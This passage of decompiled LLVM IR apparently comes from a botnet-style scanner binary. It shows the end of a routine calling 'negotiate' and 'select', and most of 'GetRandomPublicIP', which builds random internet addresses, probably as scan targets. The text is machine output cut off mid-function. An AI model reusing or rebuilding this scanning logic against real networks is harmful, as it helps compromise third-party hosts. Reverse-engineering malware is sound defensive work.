  %stack_var_-196.09 = phi i32 [ %v0_10002f1c, %dec_label_pc_1000316c.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10003158.backedge.dec_label_pc_1000316c_crit_edge ]
  %v2_10003170 = icmp sgt i32 %v3_1000316c, 0
  br i1 %v2_10003170, label %dec_label_pc_10002f54, label %dec_label_pc_10003178

dec_label_pc_10003178:                            ; preds = %dec_label_pc_1000316c
  br i1 %v2_1000317c, label %dec_label_pc_10002f54, label %dec_label_pc_1000319c

dec_label_pc_10003190:                            ; preds = %dec_label_pc_10003114, %dec_label_pc_10003138
  br label %dec_label_pc_100031a4

dec_label_pc_1000319c:                            ; preds = %dec_label_pc_10003158.backedge, %dec_label_pc_10003178, %dec_label_pc_10002f98, %entry
  br label %dec_label_pc_100031a4

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_10003190, %dec_label_pc_10003108, %dec_label_pc_100030d0, %dec_label_pc_10003060, %dec_label_pc_1000319c
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000319c ], [ 1, %dec_label_pc_10003190 ], [ 0, %dec_label_pc_10003060 ], [ 0, %dec_label_pc_100030d0 ], [ 0, %dec_label_pc_10003108 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10003074, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002f84, { 1, 0 }
  uselistorder i32 %v2_10002f54, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_100031a4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000319c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10003190, { 1, 0 }
  uselistorder label %dec_label_pc_10003158.backedge, { 1, 0, 2 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* bitcast (i32* @global_var_100285c9.52 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_100285ca.53 to i8*), align 4
  store i8 0, i8* @global_var_100285cb.54, align 1
  store i8 0, i8* @global_var_100285cc.55, align 1
  store i32 268448284, i32* @lr, align 4
  %v0_10003218 = call i32 @random()
  %v2_10003238 = srem i32 %v0_10003218, 255
  %v1_10003260 = trunc i32 %v2_10003238 to i8
  store i8 %v1_10003260, i8* bitcast (i32* @global_var_100285c9.52 to i8*), align 4
  store i32 268448360, i32* @lr, align 4
  %v0_10003264 = call i32 @random()
  %v2_10003284 = srem i32 %v0_10003264, 255
  %v1_100032ac = trunc i32 %v2_10003284 to i8
  store i8 %v1_100032ac, i8* bitcast (i32* @global_var_100285ca.53 to i8*), align 4
  store i32 268448436, i32* @lr, align 4
  %v0_100032b0 = call i32 @random()
  %v2_100032d0 = srem i32 %v0_100032b0, 255
  %v1_100032f8 = trunc i32 %v2_100032d0 to i8
  store i8 %v1_100032f8, i8* @global_var_100285cb.54, align 1
  store i32 268448512, i32* @lr, align 4
  %v0_100032fc = call i32 @random()
  %v2_1000331c = srem i32 %v0_100032fc, 255
  %v1_10003344 = trunc i32 %v2_1000331c to i8
  store i8 %v1_10003344, i8* @global_var_100285cc.55, align 1
  store i32 268448588, i32* @lr, align 4
  %v0_10003348 = call i32 @random()
  %v2_10003364 = srem i32 %v0_10003348, 208
  %v3_10003378 = icmp eq i32 %v2_10003364, 0
  br i1 %v3_10003378, label %dec_label_pc_10003380, label %dec_label_pc_100033c8

dec_label_pc_10003380:                            ; preds = %entry
  %v2_10003380 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003394 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003394 = zext i8 %v3_10003394 to i32
  %v4_100033c4 = call i32 @szprintf(i32 %v2_10003380, i32 ptrtoint ([12 x i8]* @global_var_100150e4.56 to i32), i32 %v4_10003394)
  br label %dec_label_pc_100033c8

dec_label_pc_100033c8:                            ; preds = %entry, %dec_label_pc_10003380
  %v3_100033cc = icmp eq i32 %v2_10003364, 1
  br i1 %v3_100033cc, label %dec_label_pc_100033d4, label %dec_label_pc_1000341c

dec_label_pc_100033d4:                            ; preds = %dec_label_pc_100033c8
  %v2_100033d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100033e8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100033e8 = zext i8 %v3_100033e8 to i32
  %v4_10003418 = call i32 @szprintf(i32 %v2_100033d4, i32 ptrtoint ([15 x i8]* @global_var_100150f0.57 to i32), i32 %v4_100033e8)
  br label %dec_label_pc_1000341c

dec_label_pc_1000341c:                            ; preds = %dec_label_pc_100033c8, %dec_label_pc_100033d4
  %v3_10003420 = icmp eq i32 %v2_10003364, 2
  br i1 %v3_10003420, label %dec_label_pc_10003428, label %dec_label_pc_10003470

dec_label_pc_10003428:                            ; preds = %dec_label_pc_1000341c
  %v2_10003428 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000343c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000343c = zext i8 %v3_1000343c to i32
  %v4_1000346c = call i32 @szprintf(i32 %v2_10003428, i32 ptrtoint ([12 x i8]* @global_var_10015100.58 to i32), i32 %v4_1000343c)
  br label %dec_label_pc_10003470

dec_label_pc_10003470:                            ; preds = %dec_label_pc_1000341c, %dec_label_pc_10003428
  %v3_10003474 = icmp eq i32 %v2_10003364, 3
  br i1 %v3_10003474, label %dec_label_pc_1000347c, label %dec_label_pc_100034c4

dec_label_pc_1000347c:                            ; preds = %dec_label_pc_10003470
  %v2_1000347c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003490 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003490 = zext i8 %v3_10003490 to i32
  %v4_100034c0 = call i32 @szprintf(i32 %v2_1000347c, i32 ptrtoint ([13 x i8]* @global_var_1001510c.59 to i32), i32 %v4_10003490)
  br label %dec_label_pc_100034c4

dec_label_pc_100034c4:                            ; preds = %dec_label_pc_10003470, %dec_label_pc_1000347c
  %v3_100034c8 = icmp eq i32 %v2_10003364, 4
  br i1 %v3_100034c8, label %dec_label_pc_100034d0, label %dec_label_pc_10003518

dec_label_pc_100034d0:                            ; preds = %dec_label_pc_100034c4
  %v2_100034d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100034e4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100034e4 = zext i8 %v3_100034e4 to i32
  %v4_10003514 = call i32 @szprintf(i32 %v2_100034d0, i32 ptrtoint ([11 x i8]* @global_var_1001511c.60 to i32), i32 %v4_100034e4)
  br label %dec_label_pc_10003518

dec_label_pc_10003518:                            ; preds = %dec_label_pc_100034c4, %dec_label_pc_100034d0
  %v3_1000351c = icmp eq i32 %v2_10003364, 5
  br i1 %v3_1000351c, label %dec_label_pc_10003524, label %dec_label_pc_1000356c

dec_label_pc_10003524:                            ; preds = %dec_label_pc_10003518
  %v2_10003524 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003538 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003538 = zext i8 %v3_10003538 to i32
  %v4_10003568 = call i32 @szprintf(i32 %v2_10003524, i32 ptrtoint ([14 x i8]* @global_var_10015128.61 to i32), i32 %v4_10003538)
  br label %dec_label_pc_1000356c

dec_label_pc_1000356c:                            ; preds = %dec_label_pc_10003518, %dec_label_pc_10003524
  %v3_10003570 = icmp eq i32 %v2_10003364, 6
  br i1 %v3_10003570, label %dec_label_pc_10003578, label %dec_label_pc_100035c0

dec_label_pc_10003578:                            ; preds = %dec_label_pc_1000356c
  %v2_10003578 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000358c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000358c = zext i8 %v3_1000358c to i32
  %v4_100035bc = call i32 @szprintf(i32 %v2_10003578, i32 ptrtoint ([12 x i8]* @global_var_10015138.62 to i32), i32 %v4_1000358c)
  br label %dec_label_pc_100035c0

dec_label_pc_100035c0:                            ; preds = %dec_label_pc_1000356c, %dec_label_pc_10003578
  %v3_100035c4 = icmp eq i32 %v2_10003364, 7
  br i1 %v3_100035c4, label %dec_label_pc_100035cc, label %dec_label_pc_10003614

dec_label_pc_100035cc:                            ; preds = %dec_label_pc_100035c0
  %v2_100035cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100035e0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100035e0 = zext i8 %v3_100035e0 to i32
  %v4_10003610 = call i32 @szprintf(i32 %v2_100035cc, i32 ptrtoint ([13 x i8]* @global_var_10015144.63 to i32), i32 %v4_100035e0)
  br label %dec_label_pc_10003614

dec_label_pc_10003614:                            ; preds = %dec_label_pc_100035c0, %dec_label_pc_100035cc
  %v3_10003618 = icmp eq i32 %v2_10003364, 8
  br i1 %v3_10003618, label %dec_label_pc_10003620, label %dec_label_pc_10003668

dec_label_pc_10003620:                            ; preds = %dec_label_pc_10003614
  %v2_10003620 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003634 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003634 = zext i8 %v3_10003634 to i32
  %v4_10003664 = call i32 @szprintf(i32 %v2_10003620, i32 ptrtoint ([14 x i8]* @global_var_10015154.64 to i32), i32 %v4_10003634)
  br label %dec_label_pc_10003668

dec_label_pc_10003668:                            ; preds = %dec_label_pc_10003614, %dec_label_pc_10003620
  %v3_1000366c = icmp eq i32 %v2_10003364, 9
  br i1 %v3_1000366c, label %dec_label_pc_10003674, label %dec_label_pc_100036bc

dec_label_pc_10003674:                            ; preds = %dec_label_pc_10003668
  %v2_10003674 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003688 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003688 = zext i8 %v3_10003688 to i32
  %v4_100036b8 = call i32 @szprintf(i32 %v2_10003674, i32 ptrtoint ([14 x i8]* @global_var_10015164.65 to i32), i32 %v4_10003688)
  br label %dec_label_pc_100036bc

dec_label_pc_100036bc:                            ; preds = %dec_label_pc_10003668, %dec_label_pc_10003674
  %v3_100036c0 = icmp eq i32 %v2_10003364, 10
  br i1 %v3_100036c0, label %dec_label_pc_100036c8, label %dec_label_pc_10003710

dec_label_pc_100036c8:                            ; preds = %dec_label_pc_100036bc
  %v2_100036c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100036dc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100036dc = zext i8 %v3_100036dc to i32
  %v4_1000370c = call i32 @szprintf(i32 %v2_100036c8, i32 ptrtoint ([14 x i8]* @global_var_10015174.66 to i32), i32 %v4_100036dc)
  br label %dec_label_pc_10003710

dec_label_pc_10003710:                            ; preds = %dec_label_pc_100036bc, %dec_label_pc_100036c8
  %v3_10003714 = icmp eq i32 %v2_10003364, 11
  br i1 %v3_10003714, label %dec_label_pc_1000371c, label %dec_label_pc_10003764

dec_label_pc_1000371c:                            ; preds = %dec_label_pc_10003710
  %v2_1000371c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003730 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003730 = zext i8 %v3_10003730 to i32
  %v4_10003760 = call i32 @szprintf(i32 %v2_1000371c, i32 ptrtoint ([11 x i8]* @global_var_10015184.67 to i32), i32 %v4_10003730)
  br label %dec_label_pc_10003764

dec_label_pc_10003764:                            ; preds = %dec_label_pc_10003710, %dec_label_pc_1000371c
  %v3_10003768 = icmp eq i32 %v2_10003364, 12
  br i1 %v3_10003768, label %dec_label_pc_10003770, label %dec_label_pc_100037b8

dec_label_pc_10003770:                            ; preds = %dec_label_pc_10003764
  %v2_10003770 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003784 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003784 = zext i8 %v3_10003784 to i32
  %v4_100037b4 = call i32 @szprintf(i32 %v2_10003770, i32 ptrtoint ([14 x i8]* @global_var_10015190.68 to i32), i32 %v4_10003784)
  br label %dec_label_pc_100037b8

dec_label_pc_100037b8:                            ; preds = %dec_label_pc_10003764, %dec_label_pc_10003770
  %v3_100037bc = icmp eq i32 %v2_10003364, 13
  br i1 %v3_100037bc, label %dec_label_pc_100037c4, label %dec_label_pc_1000380c

dec_label_pc_100037c4:                            ; preds = %dec_label_pc_100037b8
  %v2_100037c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100037d8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100037d8 = zext i8 %v3_100037d8 to i32
  %v4_10003808 = call i32 @szprintf(i32 %v2_100037c4, i32 ptrtoint ([13 x i8]* @global_var_100151a0.69 to i32), i32 %v4_100037d8)
  br label %dec_label_pc_1000380c

dec_label_pc_1000380c:                            ; preds = %dec_label_pc_100037b8, %dec_label_pc_100037c4
  %v3_10003810 = icmp eq i32 %v2_10003364, 14
  br i1 %v3_10003810, label %dec_label_pc_10003818, label %dec_label_pc_10003860

dec_label_pc_10003818:                            ; preds = %dec_label_pc_1000380c
  %v2_10003818 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000382c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000382c = zext i8 %v3_1000382c to i32
  %v4_1000385c = call i32 @szprintf(i32 %v2_10003818, i32 ptrtoint ([13 x i8]* @global_var_100151b0.70 to i32), i32 %v4_1000382c)
  br label %dec_label_pc_10003860

dec_label_pc_10003860:                            ; preds = %dec_label_pc_1000380c, %dec_label_pc_10003818
  %v3_10003864 = icmp eq i32 %v2_10003364, 15
  br i1 %v3_10003864, label %dec_label_pc_1000386c, label %dec_label_pc_100038b4

dec_label_pc_1000386c:                            ; preds = %dec_label_pc_10003860
  %v2_1000386c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003880 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003880 = zext i8 %v3_10003880 to i32
  %v4_100038b0 = call i32 @szprintf(i32 %v2_1000386c, i32 ptrtoint ([13 x i8]* @global_var_100151c0.71 to i32), i32 %v4_10003880)
  br label %dec_label_pc_100038b4

dec_label_pc_100038b4:                            ; preds = %dec_label_pc_10003860, %dec_label_pc_1000386c
  %v3_100038b8 = icmp eq i32 %v2_10003364, 16
  br i1 %v3_100038b8, label %dec_label_pc_100038c0, label %dec_label_pc_10003908

dec_label_pc_100038c0:                            ; preds = %dec_label_pc_100038b4
  %v2_100038c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100038d4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100038d4 = zext i8 %v3_100038d4 to i32
  %v4_10003904 = call i32 @szprintf(i32 %v2_100038c0, i32 ptrtoint ([14 x i8]* @global_var_100151d0.72 to i32), i32 %v4_100038d4)
  br label %dec_label_pc_10003908

dec_label_pc_10003908:                            ; preds = %dec_label_pc_100038b4, %dec_label_pc_100038c0
  %v3_1000390c = icmp eq i32 %v2_10003364, 17
  br i1 %v3_1000390c, label %dec_label_pc_10003914, label %dec_label_pc_1000395c

dec_label_pc_10003914:                            ; preds = %dec_label_pc_10003908
  %v2_10003914 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003928 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003928 = zext i8 %v3_10003928 to i32
  %v4_10003958 = call i32 @szprintf(i32 %v2_10003914, i32 ptrtoint ([13 x i8]* @global_var_100151e0.73 to i32), i32 %v4_10003928)
  br label %dec_label_pc_1000395c

dec_label_pc_1000395c:                            ; preds = %dec_label_pc_10003908, %dec_label_pc_10003914
  %v3_10003960 = icmp eq i32 %v2_10003364, 18
  br i1 %v3_10003960, label %dec_label_pc_10003968, label %dec_label_pc_100039b0

dec_label_pc_10003968:                            ; preds = %dec_label_pc_1000395c
  %v2_10003968 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000397c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000397c = zext i8 %v3_1000397c to i32
  %v4_100039ac = call i32 @szprintf(i32 %v2_10003968, i32 ptrtoint ([13 x i8]* @global_var_100151f0.74 to i32), i32 %v4_1000397c)
  br label %dec_label_pc_100039b0

dec_label_pc_100039b0:                            ; preds = %dec_label_pc_1000395c, %dec_label_pc_10003968
  %v3_100039b4 = icmp eq i32 %v2_10003364, 19
  br i1 %v3_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_10003a04

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039b0
  %v2_100039bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100039d0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100039d0 = zext i8 %v3_100039d0 to i32
  %v4_10003a00 = call i32 @szprintf(i32 %v2_100039bc, i32 ptrtoint ([11 x i8]* @global_var_10015200.75 to i32), i32 %v4_100039d0)
  br label %dec_label_pc_10003a04

dec_label_pc_10003a04:                            ; preds = %dec_label_pc_100039b0, %dec_label_pc_100039bc
  %v3_10003a08 = icmp eq i32 %v2_10003364, 20
  br i1 %v3_10003a08, label %dec_label_pc_10003a10, label %dec_label_pc_10003a58

dec_label_pc_10003a10:                            ; preds = %dec_label_pc_10003a04
  %v2_10003a10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a24 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003a24 = zext i8 %v3_10003a24 to i32
  %v4_10003a54 = call i32 @szprintf(i32 %v2_10003a10, i32 ptrtoint ([12 x i8]* @global_var_1001520c.76 to i32), i32 %v4_10003a24)
  br label %dec_label_pc_10003a58

dec_label_pc_10003a58:                            ; preds = %dec_label_pc_10003a04, %dec_label_pc_10003a10
  %v3_10003a5c = icmp eq i32 %v2_10003364, 21
  br i1 %v3_10003a5c, label %dec_label_pc_10003a64, label %dec_label_pc_10003aac

dec_label_pc_10003a64:                            ; preds = %dec_label_pc_10003a58
  %v2_10003a64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003a78 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003a78 = zext i8 %v3_10003a78 to i32
  %v4_10003aa8 = call i32 @szprintf(i32 %v2_10003a64, i32 ptrtoint ([14 x i8]* @global_var_10015218.77 to i32), i32 %v4_10003a78)
  br label %dec_label_pc_10003aac

dec_label_pc_10003aac:                            ; preds = %dec_label_pc_10003a58, %dec_label_pc_10003a64
  %v3_10003ab0 = icmp eq i32 %v2_10003364, 22
  br i1 %v3_10003ab0, label %dec_label_pc_10003ab8, label %dec_label_pc_10003b00

dec_label_pc_10003ab8:                            ; preds = %dec_label_pc_10003aac
  %v2_10003ab8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003acc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003acc = zext i8 %v3_10003acc to i32
  %v4_10003afc = call i32 @szprintf(i32 %v2_10003ab8, i32 ptrtoint ([12 x i8]* @global_var_10015228.78 to i32), i32 %v4_10003acc)
  br label %dec_label_pc_10003b00

dec_label_pc_10003b00:                            ; preds = %dec_label_pc_10003aac, %dec_label_pc_10003ab8
  %v3_10003b04 = icmp eq i32 %v2_10003364, 23
  br i1 %v3_10003b04, label %dec_label_pc_10003b0c, label %dec_label_pc_10003b54

dec_label_pc_10003b0c:                            ; preds = %dec_label_pc_10003b00
  %v2_10003b0c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b20 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003b20 = zext i8 %v3_10003b20 to i32
  %v4_10003b50 = call i32 @szprintf(i32 %v2_10003b0c, i32 ptrtoint ([12 x i8]* @global_var_10015234.79 to i32), i32 %v4_10003b20)
  br label %dec_label_pc_10003b54

dec_label_pc_10003b54:                            ; preds = %dec_label_pc_10003b00, %dec_label_pc_10003b0c
  %v3_10003b58 = icmp eq i32 %v2_10003364, 24
  br i1 %v3_10003b58, label %dec_label_pc_10003b60, label %dec_label_pc_10003ba8

dec_label_pc_10003b60:                            ; preds = %dec_label_pc_10003b54
  %v2_10003b60 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003b74 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003b74 = zext i8 %v3_10003b74 to i32
  %v4_10003ba4 = call i32 @szprintf(i32 %v2_10003b60, i32 ptrtoint ([13 x i8]* @global_var_10015240.80 to i32), i32 %v4_10003b74)
  br label %dec_label_pc_10003ba8

dec_label_pc_10003ba8:                            ; preds = %dec_label_pc_10003b54, %dec_label_pc_10003b60
  %v3_10003bac = icmp eq i32 %v2_10003364, 25
  br i1 %v3_10003bac, label %dec_label_pc_10003bb4, label %dec_label_pc_10003bfc

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003ba8
  %v2_10003bb4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003bc8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003bc8 = zext i8 %v3_10003bc8 to i32
  %v4_10003bf8 = call i32 @szprintf(i32 %v2_10003bb4, i32 ptrtoint ([13 x i8]* @global_var_10015250.81 to i32), i32 %v4_10003bc8)
  br label %dec_label_pc_10003bfc

dec_label_pc_10003bfc:                            ; preds = %dec_label_pc_10003ba8, %dec_label_pc_10003bb4
  %v3_10003c00 = icmp eq i32 %v2_10003364, 26
  br i1 %v3_10003c00, label %dec_label_pc_10003c08, label %dec_label_pc_10003c50

dec_label_pc_10003c08:                            ; preds = %dec_label_pc_10003bfc
  %v2_10003c08 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c1c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003c1c = zext i8 %v3_10003c1c to i32
  %v4_10003c4c = call i32 @szprintf(i32 %v2_10003c08, i32 ptrtoint ([13 x i8]* @global_var_10015260.82 to i32), i32 %v4_10003c1c)
  br label %dec_label_pc_10003c50

dec_label_pc_10003c50:                            ; preds = %dec_label_pc_10003bfc, %dec_label_pc_10003c08
  %v3_10003c54 = icmp eq i32 %v2_10003364, 27
  br i1 %v3_10003c54, label %dec_label_pc_10003c5c, label %dec_label_pc_10003ca4

dec_label_pc_10003c5c:                            ; preds = %dec_label_pc_10003c50
  %v2_10003c5c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003c70 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003c70 = zext i8 %v3_10003c70 to i32
  %v4_10003ca0 = call i32 @szprintf(i32 %v2_10003c5c, i32 ptrtoint ([14 x i8]* @global_var_10015270.83 to i32), i32 %v4_10003c70)
  br label %dec_label_pc_10003ca4

dec_label_pc_10003ca4:                            ; preds = %dec_label_pc_10003c50, %dec_label_pc_10003c5c
  %v3_10003ca8 = icmp eq i32 %v2_10003364, 28
  br i1 %v3_10003ca8, label %dec_label_pc_10003cb0, label %dec_label_pc_10003cf8

dec_label_pc_10003cb0:                            ; preds = %dec_label_pc_10003ca4
  %v2_10003cb0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003cc4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003cc4 = zext i8 %v3_10003cc4 to i32
  %v4_10003cf4 = call i32 @szprintf(i32 %v2_10003cb0, i32 ptrtoint ([14 x i8]* @global_var_10015280.84 to i32), i32 %v4_10003cc4)
  br label %dec_label_pc_10003cf8

dec_label_pc_10003cf8:                            ; preds = %dec_label_pc_10003ca4, %dec_label_pc_10003cb0
  %v3_10003cfc = icmp eq i32 %v2_10003364, 29
  br i1 %v3_10003cfc, label %dec_label_pc_10003d04, label %dec_label_pc_10003d4c

dec_label_pc_10003d04:                            ; preds = %dec_label_pc_10003cf8
  %v2_10003d04 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d18 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003d18 = zext i8 %v3_10003d18 to i32
  %v4_10003d48 = call i32 @szprintf(i32 %v2_10003d04, i32 ptrtoint ([12 x i8]* @global_var_10015290.85 to i32), i32 %v4_10003d18)
  br label %dec_label_pc_10003d4c

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003cf8, %dec_label_pc_10003d04
  %v3_10003d50 = icmp eq i32 %v2_10003364, 30
  br i1 %v3_10003d50, label %dec_label_pc_10003d58, label %dec_label_pc_10003da0

dec_label_pc_10003d58:                            ; preds = %dec_label_pc_10003d4c
  %v2_10003d58 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003d6c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003d6c = zext i8 %v3_10003d6c to i32
  %v4_10003d9c = call i32 @szprintf(i32 %v2_10003d58, i32 ptrtoint ([13 x i8]* @global_var_1001529c.86 to i32), i32 %v4_10003d6c)
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d58
  %v3_10003da4 = icmp eq i32 %v2_10003364, 31
  br i1 %v3_10003da4, label %dec_label_pc_10003dac, label %dec_label_pc_10003df4

dec_label_pc_10003dac:                            ; preds = %dec_label_pc_10003da0
  %v2_10003dac = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003dc0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003dc0 = zext i8 %v3_10003dc0 to i32
  %v4_10003df0 = call i32 @szprintf(i32 %v2_10003dac, i32 ptrtoint ([12 x i8]* @global_var_100152ac.87 to i32), i32 %v4_10003dc0)
  br label %dec_label_pc_10003df4

dec_label_pc_10003df4:                            ; preds = %dec_label_pc_10003da0, %dec_label_pc_10003dac
  %v3_10003df8 = icmp eq i32 %v2_10003364, 32
  br i1 %v3_10003df8, label %dec_label_pc_10003e00, label %dec_label_pc_10003e48

dec_label_pc_10003e00:                            ; preds = %dec_label_pc_10003df4
  %v2_10003e00 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e14 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003e14 = zext i8 %v3_10003e14 to i32
  %v4_10003e44 = call i32 @szprintf(i32 %v2_10003e00, i32 ptrtoint ([11 x i8]* @global_var_100152b8.88 to i32), i32 %v4_10003e14)
  br label %dec_label_pc_10003e48

dec_label_pc_10003e48:                            ; preds = %dec_label_pc_10003df4, %dec_label_pc_10003e00
  %v3_10003e4c = icmp eq i32 %v2_10003364, 33
  br i1 %v3_10003e4c, label %dec_label_pc_10003e54, label %dec_label_pc_10003e9c

dec_label_pc_10003e54:                            ; preds = %dec_label_pc_10003e48
  %v2_10003e54 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003e68 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003e68 = zext i8 %v3_10003e68 to i32
  %v4_10003e98 = call i32 @szprintf(i32 %v2_10003e54, i32 ptrtoint ([12 x i8]* @global_var_100152c4.89 to i32), i32 %v4_10003e68)
  br label %dec_label_pc_10003e9c

dec_label_pc_10003e9c:                            ; preds = %dec_label_pc_10003e48, %dec_label_pc_10003e54
  %v3_10003ea0 = icmp eq i32 %v2_10003364, 34
  br i1 %v3_10003ea0, label %dec_label_pc_10003ea8, label %dec_label_pc_10003ef0

dec_label_pc_10003ea8:                            ; preds = %dec_label_pc_10003e9c
  %v2_10003ea8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003ebc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003ebc = zext i8 %v3_10003ebc to i32
  %v4_10003eec = call i32 @szprintf(i32 %v2_10003ea8, i32 ptrtoint ([12 x i8]* @global_var_100152d0.90 to i32), i32 %v4_10003ebc)
  br label %dec_label_pc_10003ef0

dec_label_pc_10003ef0:                            ; preds = %dec_label_pc_10003e9c, %dec_label_pc_10003ea8
  %v3_10003ef4 = icmp eq i32 %v2_10003364, 35
  br i1 %v3_10003ef4, label %dec_label_pc_10003efc, label %dec_label_pc_10003f44

dec_label_pc_10003efc:                            ; preds = %dec_label_pc_10003ef0
  %v2_10003efc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f10 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003f10 = zext i8 %v3_10003f10 to i32
  %v4_10003f40 = call i32 @szprintf(i32 %v2_10003efc, i32 ptrtoint ([12 x i8]* @global_var_100152dc.91 to i32), i32 %v4_10003f10)
  br label %dec_label_pc_10003f44

dec_label_pc_10003f44:                            ; preds = %dec_label_pc_10003ef0, %dec_label_pc_10003efc
  %v3_10003f48 = icmp eq i32 %v2_10003364, 36
  br i1 %v3_10003f48, label %dec_label_pc_10003f50, label %dec_label_pc_10003f98

dec_label_pc_10003f50:                            ; preds = %dec_label_pc_10003f44
  %v2_10003f50 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003f64 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003f64 = zext i8 %v3_10003f64 to i32
  %v4_10003f94 = call i32 @szprintf(i32 %v2_10003f50, i32 ptrtoint ([12 x i8]* @global_var_100152e8.92 to i32), i32 %v4_10003f64)
  br label %dec_label_pc_10003f98

dec_label_pc_10003f98:                            ; preds = %dec_label_pc_10003f44, %dec_label_pc_10003f50
  %v3_10003f9c = icmp eq i32 %v2_10003364, 37
  br i1 %v3_10003f9c, label %dec_label_pc_10003fa4, label %dec_label_pc_10003fec

dec_label_pc_10003fa4:                            ; preds = %dec_label_pc_10003f98
  %v2_10003fa4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003fb8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10003fb8 = zext i8 %v3_10003fb8 to i32
  %v4_10003fe8 = call i32 @szprintf(i32 %v2_10003fa4, i32 ptrtoint ([12 x i8]* @global_var_100152f4.93 to i32), i32 %v4_10003fb8)
  br label %dec_label_pc_10003fec

